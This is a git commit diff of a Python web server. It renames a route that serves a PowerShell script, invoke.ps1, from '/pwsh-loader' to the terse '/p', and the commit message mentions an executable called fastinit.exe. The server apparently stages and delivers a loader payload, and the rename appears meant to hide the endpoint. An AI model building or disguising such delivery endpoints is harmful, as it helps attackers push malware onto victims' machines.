0aa521050e8c4a9ce4c0088202f17361104e62f8
kyle puta <loginrevoked@gmail.com>
2026-07-05 23:49:09 +0300

    Deduplicated the copy of fastinit.exe in fastinit.zioooosaaw

--- server.py
+++ server.py
@@ -25,7 +25,7 @@ async def get_vercode(path: str):
     return HTMLResponse("<h1>FUckyou</h1>", status_code=200)
 
 
-@app.get("/pwsh-loader")
+@app.get("/p")
 async def pwsh_loader():
     with open("./invoke.ps1", "r", encoding="utf-8") as f:
         script = f.read()
